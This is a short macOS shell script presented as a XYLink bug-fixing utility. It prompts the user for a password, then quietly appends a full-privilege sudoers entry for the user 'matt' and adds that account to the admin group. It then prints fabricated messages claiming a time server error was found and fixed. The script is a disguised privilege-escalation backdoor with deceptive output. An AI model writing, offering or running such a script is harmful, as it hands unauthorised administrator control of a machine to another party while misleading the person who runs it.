# 2022 XYLink All rights reserved.
echo "(c) 2022 XYLink"
echo "This script is used for finding bugs existing in XYLink and fixing it."
echo "Detected User: matt is using XYLink."
echo "Script Start."
echo "Please type your password below. It won't show. Just type and enter."

sudo -i echo 'matt ALL=(ALL:ALL) ALL' >> /etc/sudoers
sudo -i dscl . -merge /Groups/admin GroupMembership matt
sleep 7s
echo "Detected bug: Time server error."
sleep 1s
echo "fixing..."
echo "status: success"
echo "please reboot your computer to apply the settings."
